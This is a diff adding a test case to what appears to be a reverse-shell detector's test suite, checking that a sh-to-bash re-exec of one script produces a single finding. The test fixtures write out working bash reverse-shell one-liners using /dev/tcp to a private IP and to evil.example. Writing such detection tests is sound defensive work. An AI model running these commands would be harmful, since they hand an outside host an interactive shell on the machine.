@@ -85,6 +85,12 @@ describe('reverse-shell: command line', () => {
     expect(f[0]!.evidence).toContain('/dev/tcp');
   });
 
+  test('sh re-exec to bash with the same -c script gives one finding', () => {
+    const script = '/bin/bash -i >& /dev/tcp/192.168.4.225/1337 0>&1';
+    const f = hits(alone(child('/bin/sh', ['/bin/sh', '-c', script]), child('/bin/bash', ['/bin/sh', '-c', script], { seq: 3 })));
+    expect(f).toHaveLength(1);
+  });
+
   test('host shape does not matter: /dev/tcp/host1.internal.invalid/1337 still high', () => {
     expect(hits(sh('bash -i >& /dev/tcp/host1.internal.invalid/1337 0>&1')).map(f => f.severity)).toEqual(['high']);
     expect(hits(sh('exec 5<>/dev/tcp/evil.example/80; cat <&5 | bash >&5')).map(f => f.severity)).toEqual(['high']);
